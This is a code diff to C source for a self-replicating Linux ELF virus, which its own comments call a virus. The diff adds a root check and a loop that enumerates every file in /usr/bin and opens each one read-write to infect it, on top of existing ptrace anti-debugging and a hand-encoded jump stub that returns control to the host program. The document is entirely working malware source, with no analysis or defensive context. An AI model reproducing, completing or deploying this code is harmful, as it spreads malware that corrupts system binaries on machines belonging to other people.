@@ -13,21 +13,30 @@
 #define SYS_LSEEK	8
 #define SYS_EXIT	60
 #define SYS_PTRACE	101
-#define SYS_GETPID	39
-#define _exit(x) 		syscall1(SYS_EXIT, (long)(x))
-#define read(fd, buf, len) 	syscall3(SYS_READ, (long)fd, (long)(buf), (long)len)
-#define write(fd, buf, len) 	syscall3(SYS_WRITE, (long)fd, (long)(buf), (long)len)
-#define lseek(fd, offset, origin) 	syscall3(SYS_LSEEK, (long)fd, (long)(offset), (long)origin)
-#define open(filename, flags, mode) 	syscall3(SYS_OPEN, \
-	       				(long)(filename), (long)flags, (long)mode)
-#define close(fd)		syscall1(SYS_CLOSE, fd)
-#define ptrace(request, pid, addr, data) syscall4(SYS_PTRACE, (long)request, (long)pid, (long)addr, (long)data)
+#define SYS_GETUID	102
+#define SYS_GETDENTS64	217
+#define SYS_OPENAT	257
 
+
+#define _exit(x) 				syscall1(SYS_EXIT, (long)(x))
+#define read(fd, buf, len) 			syscall3(SYS_READ, (long)fd, (long)(buf), (long)len)
+#define write(fd, buf, len) 			syscall3(SYS_WRITE, (long)fd, (long)(buf), (long)len)
+#define lseek(fd, offset, origin) 		syscall3(SYS_LSEEK, (long)fd, (long)(offset), (long)origin)
+#define open(filename, flags, mode) 		syscall3(SYS_OPEN, (long)(filename), (long)flags, (long)mode)
+#define openat(dfd, filename, flags, mode) 	syscall4(SYS_OPENAT, (long)dfd, (long)(filename), (long)flags, (long)mode)
+#define close(fd)				syscall1(SYS_CLOSE, fd)
+#define ptrace(request, pid, addr, data) 	syscall4(SYS_PTRACE, (long)(request), (long)(pid), (long)(addr), (long)(data))
+#define getdents64(dfd, dirent, count) 		syscall3(SYS_GETDENTS64, (long)(dfd), (long)(dirent), (long)count)
+#define getuid() 				syscall1(SYS_GETUID, 0)
+
+#define O_RDONLY        0
 #define O_RDWR		2
 
 #define SEEK_SET	0
 #define SEEK_CUR	1
 #define SEEK_END	2
+
+#define AT_FDCWD            -100
 
 /* ELF format start */
 #define EI_NIDENT (16)
@@ -94,6 +103,16 @@ typedef struct
 /* ptrace */
 #define PTRACE_ME	0
 
+/* Dirent - struct from linux kernel source */
+#define O_DIRECTORY  0200000
+ struct linux_dirent64 {
+	unsigned long	d_ino;
+	signed long	d_off;
+	unsigned short	d_reclen;
+	unsigned char   d_type;
+	char		d_name[0];
+};
+
 static inline long syscall1(int num, long a1) __attribute__((always_inline));
 static inline long syscall1(int num, long a1) 
 {
@@ -150,7 +169,7 @@ void _start(void)
 {
 	__asm__ __volatile__ (
 		/* handle stack manually.... yes this is fight agains compiler :( */
-		"add $0x318, %rsp\n"
+		"add $0x83c8, %rsp\n"
 		/* This is needed because if I don't do it,
 		 * then I will crash to glibc pointer protection.
 		 */
@@ -163,10 +182,9 @@ void _start(void)
 		"pushq %rbp\n"
 
 		/* allocate spack space for virus */
-		"sub $0x318, %rsp\n"
+		"sub $0x83c8, %rsp\n"
 	);
 
-	char a[5];
 	volatile Elf64_Ehdr ehdr;
 	volatile Elf64_Phdr phdr;
 	volatile Elf64_Phdr phdr_next;
@@ -175,21 +193,22 @@ void _start(void)
 	Elf64_Half p;
 	unsigned char jmp[27];
 
+	volatile long fd;
+	volatile long dfd;
+
+	volatile char buf[32768];
+	volatile struct linux_dirent64 *d;
+	unsigned long nread;
+	unsigned long skip;
+	volatile char *file_name;
+
 	/* Primitive anti-debugging technique */
 	if (ptrace(PTRACE_ME, 0, 0, 0) == -1) {
 		goto label2;
 	}
 
-	/* Count size of _start function of virus */
-	real_code_size = (long)&&label2 - (long)&_start;
-	a[0] = 'a';
-	a[1] = 'a';
-	a[2] = 'a';
-	a[3] = 'a';
-	a[4] = '\0';
-
 	/* Just one by one.. because this will be
-	 * translated to mov instructinos inside .text
+	 * translated to mov instructions inside .text
 	 * section.
 	 * For more details, look at tail.asm.
 	 * PS: comments are in intel syntax assembly */
@@ -198,8 +217,8 @@ void _start(void)
 	jmp[0] = '\x48'; 
 	jmp[1] = '\x81';
 	jmp[2] = '\xc4';
-	jmp[3] = '\x18';
-	jmp[4] = '\x03';
+	jmp[3] = '\xc8';
+	jmp[4] = '\x83';
 	jmp[5] = '\x00';
 	jmp[6] = '\x00';
 
@@ -234,8 +253,52 @@ void _start(void)
 	/* retq */
 	jmp[26] = '\xc3';
 
+	/* Exploit this for back to loop */
+	dfd = -4096;
+
+	/* Count size of _start function of virus */
+	real_code_size = (long)&&label2 - (long)&_start;
+
+	/* Hooray! We are root! Go to /usr/bin dir! */
+	if (getuid() == 0) {
+		buf[0] = '/';
+		buf[1] = 'u';
+		buf[2] = 's';
+		buf[3] = 'r';
+		buf[4] = '/';
+		buf[5] = 'b';
+		buf[6] = 'i';
+		buf[7] = 'n';
+		buf[8] = '\0';
+
+		dfd = openat(AT_FDCWD, buf, O_RDONLY | O_DIRECTORY, 0);
+		if (dfd == -1) {
+			goto label2;
+		}
+
+//back_to_loop:
+		nread = 0;
+		while((nread = getdents64(dfd, buf, sizeof(buf))) > 0) {
+			for (skip = 0; skip < nread; ) {
+				d = (struct linux_dirent64 *)(buf +  skip);
+				/* We are, we are ... ugly as hell! */
+				if ((d->d_name[0] == '.' && d->d_name[1] == '\0')
+					|| (d->d_name[0] == '.' && d->d_name[1] == '.' && d->d_name[2] == '\0'))
+					{ skip += d->d_reclen; continue; }
+				file_name = d->d_name;
+				goto infect;
+back_to_loop:
+				skip += d->d_reclen;
+			}
+		}
+		close(dfd);
+		goto label2;
+	}
+	goto label2;
+
+infect:
 	/* loop: for all elf files in /home/user/bin */
-	volatile long fd = open(a, O_RDWR, 0);
+	fd = openat(dfd, file_name, O_RDWR, 0);
 	if (fd < 0) {
 		goto label2;
 	}
@@ -248,6 +311,7 @@ void _start(void)
 	    || ehdr.e_machine != EM_X86_64)
 	{
 		close(fd);
+		if (dfd != -4096) { goto back_to_loop; }
 		goto label2;
 	}
 
@@ -288,6 +352,7 @@ void _start(void)
 		break;
 	}	
 	close(fd);
+	if (dfd != -4096) { goto back_to_loop; }
 label2: ;
 	_exit(0);
 }
